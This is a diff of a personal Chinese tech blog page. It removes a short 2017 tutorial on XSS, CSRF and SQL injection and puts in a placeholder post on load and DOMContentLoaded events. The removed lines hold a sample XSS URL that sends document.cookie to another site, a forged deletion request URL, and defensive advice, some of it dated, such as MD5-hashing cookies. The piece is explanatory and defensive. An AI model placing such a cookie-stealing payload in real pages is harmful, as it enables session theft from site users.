@@ -4,23 +4,23 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>XSS、CSRF与SQL注入 | A Cup of Coffee</title>
+    <title>`load`与`DOMContentLoaded`事件 | A Cup of Coffee</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Mingholy">
     
 
     
-    <meta name="description" content="关于Web安全的内容经常会被问到。前端主要关注的是XSS与CSRF，而以前曾经见过SQL注入，这里一并总结一下。仅为理解概念。">
+    <meta name="description" content="挖坑待填想总结一下load、DOMContentLoaded还有jQuery里的$(document).ready()这些方法的区别。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS、CSRF与SQL注入">
-<meta property="og:url" content="http://ming-holy.space/2017/03/24/XSS-CSRF/index.html">
+<meta property="og:title" content="`load`与`DOMContentLoaded`事件">
+<meta property="og:url" content="http://ming-holy.space/2017/03/25/loadEventRelated/index.html">
 <meta property="og:site_name" content="A Cup of Coffee">
-<meta property="og:description" content="关于Web安全的内容经常会被问到。前端主要关注的是XSS与CSRF，而以前曾经见过SQL注入，这里一并总结一下。仅为理解概念。">
-<meta property="og:updated_time" content="2017-03-26T03:44:34.051Z">
+<meta property="og:description" content="挖坑待填想总结一下load、DOMContentLoaded还有jQuery里的$(document).ready()这些方法的区别。">
+<meta property="og:updated_time" content="2017-03-28T07:26:53.862Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS、CSRF与SQL注入">
-<meta name="twitter:description" content="关于Web安全的内容经常会被问到。前端主要关注的是XSS与CSRF，而以前曾经见过SQL注入，这里一并总结一下。仅为理解概念。">
+<meta name="twitter:title" content="`load`与`DOMContentLoaded`事件">
+<meta name="twitter:description" content="挖坑待填想总结一下load、DOMContentLoaded还有jQuery里的$(document).ready()这些方法的区别。">
 
     
     <link rel="alternative" href="/atom.xml" title="A Cup of Coffee" type="application/atom+xml">
@@ -80,14 +80,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/03/24/XSS-CSRF/" title="XSS、CSRF与SQL注入" itemprop="url">XSS、CSRF与SQL注入</a>
+      <a href="/2017/03/25/loadEventRelated/" title="`load`与`DOMContentLoaded`事件" itemprop="url">`load`与`DOMContentLoaded`事件</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Mingholy" target="_blank" itemprop="author">Mingholy</a>
 		
   <p class="article-time">
-    <time datetime="2017-03-24T00:37:00.000Z" itemprop="datePublished"> 发表于 2017-03-24</time>
+    <time datetime="2017-03-25T02:41:00.000Z" itemprop="datePublished"> 发表于 2017-03-25</time>
     
   </p>
 </header>
@@ -96,52 +96,11 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS与CSRF"><span class="toc-number">1.</span> <span class="toc-text">XSS与CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-Based-XSS"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">DOM Based XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Stored XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#怎样防范XSS"><span class="toc-number">1.1.2.</span> <span class="toc-text">怎样防范XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是CSRF"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#怎样防范CSRF"><span class="toc-number">1.2.2.</span> <span class="toc-text">怎样防范CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#挖坑待填"><span class="toc-number">1.</span> <span class="toc-text">挖坑待填</span></a></li></ol>
 		
 		</div>
 		
-		<blockquote>
-<p>关于Web安全的内容经常会被问到。前端主要关注的是XSS与CSRF，而以前曾经见过SQL注入，这里一并总结一下。仅为理解概念。</p>
-</blockquote>
-<a id="more"></a>
-<h1 id="XSS与CSRF"><a href="#XSS与CSRF" class="headerlink" title="XSS与CSRF"></a>XSS与CSRF</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>XSS即Cross Site Script，跨站脚本攻击。</p>
-<p>原理是利用网站中提供的输入入口，如表单等，恶意输入一些可执行的恶意代码，如果服务器对原始输入数据不加处理，这些恶意代码就可能会被当做正常代码被执行。</p>
-<p>理论上，所有可输入的地方都可能存在XSS漏洞。</p>
-<h4 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h4><p>XSS分为两种，一种是单会话中，通过在URL中添加某些脚本语句，来获得受害人的一些信息。这种攻击局限于DOM内，因此叫做DOM Based XSS。</p>
-<p>一个简单易懂的例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.a.com?content=&lt;script&gt;window.open(&quot;www.b.com?param=&quot;+document.cookie&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>很多站点，页面内容依赖URL传递，这种站点就容易被XSS攻击。因为一旦URL包含了某些可执行脚本，它就会被解析称为DOM脚本的一部分进行执行。上例中，如果一个登录到a站点的用户点击了该链接，那么包含他登录信息的cookie就会随着<code>window.open</code>发给b站点的HTTP请求被发送到b站。<br>这样b站点就盗取了用户在a站点的登录信息。</p>
-<h4 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h4><p>这种方式的攻击是，恶意用户通过某种方式将恶意代码存储在服务器上（订阅源）。比如发布一篇带有恶意代码的网络日志，则所有访问该日志的用户都可能被盗取信息。</p>
-<p>常见的例子就是钓鱼网站。</p>
-<h3 id="怎样防范XSS"><a href="#怎样防范XSS" class="headerlink" title="怎样防范XSS"></a>怎样防范XSS</h3><ol>
-<li>输入过滤<br>就是不接受用户输入的原始文本内容，而对它们进行编码。比如：<ul>
-<li>&lt;: <code>&amp;lt;</code></li>
-<li>>: <code>&amp;gt;</code></li>
-<li>&amp;: <code>&amp;amp;</code></li>
-<li>“: <code>&amp;quot;</code></li>
-<li>空格: <code>&amp;nbsp;</code></li>
-<li>ASCII字符: <code>&amp;#&lt;number&gt;</code></li>
-<li>关键字：<code>script</code>、<code>javascript</code>等</li>
-</ul>
-</li>
-<li>输出编码<br>不要在URL中显示用户信息；在需要将用户信息输出到页面中时，使用HTML Encoder编码再输出。   </li>
-<li>Cookie防盗<ul>
-<li>用MD5等方法对Cookie加密</li>
-<li>对cookie进行IP绑定</li>
-<li>让cookie在<code>document</code>对象中不可见。设置cookie参数<code>HTTPOnly</code></li>
-<li>注意设置<code>HTTPOnly</code>只能阻止对cookie的读，并不能阻止对cookie的写</li>
-</ul>
-</li>
-</ol>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><p>CSRF即Cross-site request forgery，跨站请求伪造。</p>
-<p>盗用用户身份，并以用户身份发送请求。</p>
-<p>当用户登录正规站点a后，访问恶意站点b，b就可能模拟用户操作，私自访问a站。比如通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://a.com/comment/?type=delete&amp;id=123</div></pre></td></tr></table></figure></p>
-<p>就可以删除用户在a站的信息。</p>
-<h3 id="怎样防范CSRF"><a href="#怎样防范CSRF" class="headerlink" title="怎样防范CSRF"></a>怎样防范CSRF</h3><ol>
-<li>验证码<br>在用户的关键操作上加验证码</li>
-<li>Session id/Token<br>对用户请求添加服务器与客户端协商过的唯一id，在用户发表单时带上这个id以验证身份。</li>
-</ol>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>如果后台数据库操作代码，直接使用用户输入的字符串参数来拼接SQL查询语句，那么就可能存在SQL注入。因为用户的输入将直接作为SQL语句的一部分，如果用户输入了一些SQL语句，那么这些语句将会被查询。</p>
-<p>详细请见：<a href="http://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html" target="_blank" rel="external">SQL注入攻防入门详解</a></p>
+		<h1 id="挖坑待填"><a href="#挖坑待填" class="headerlink" title="挖坑待填"></a>挖坑待填</h1><p>想总结一下<code>load</code>、<code>DOMContentLoaded</code>还有jQuery里的<code>$(document).ready()</code>这些方法的区别。</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -149,13 +108,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/前端安全/">前端安全</a>
+  <a class="article-category-link" href="/categories/JavaScript/">JavaScript</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/JavaScript/">JavaScript</a><a href="/tags/前端安全/">前端安全</a>
+  <span></span> <a href="/tags/JavaScript/">JavaScript</a><a href="/tags/DOM/">DOM</a>
   </div>
 
 </div>
@@ -164,7 +123,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://ming-holy.space/2017/03/24/XSS-CSRF/" data-title="XSS、CSRF与SQL注入 | A Cup of Coffee" data-tsina="null" class="share clearfix">
+	  <div data-url="http://ming-holy.space/2017/03/25/loadEventRelated/" data-title="`load`与`DOMContentLoaded`事件 | A Cup of Coffee" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -177,19 +136,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2017/03/24/CORS/" title="Ajax、Comet、Fetch与跨域">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Ajax、Comet、Fetch与跨域</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2017/03/23/ES6-intro/"  title="ES6总结笔记">
+<a href="/2017/03/24/HTTP-TCP-IP/"  title="HTTP、TCP/UDP和IP">
  <strong>下一篇：</strong><br/> 
- <span>ES6总结笔记
+ <span>HTTP、TCP/UDP和IP
 </span>
 </a>
 </div>
@@ -198,7 +149,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2017/03/24/XSS-CSRF/" data-title="XSS、CSRF与SQL注入" data-url="http://ming-holy.space/2017/03/24/XSS-CSRF/"></div>
+	<div class="ds-thread" data-thread-key="2017/03/25/loadEventRelated/" data-title="`load`与`DOMContentLoaded`事件" data-url="http://ming-holy.space/2017/03/25/loadEventRelated/"></div>
 </section>
 
 
@@ -208,7 +159,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS与CSRF"><span class="toc-number">1.</span> <span class="toc-text">XSS与CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XSS"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-Based-XSS"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">DOM Based XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Stored XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#怎样防范XSS"><span class="toc-number">1.1.2.</span> <span class="toc-text">怎样防范XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是CSRF"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#怎样防范CSRF"><span class="toc-number">1.2.2.</span> <span class="toc-text">怎样防范CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#挖坑待填"><span class="toc-number">1.</span> <span class="toc-text">挖坑待填</span></a></li></ol>
  
   </div>
 
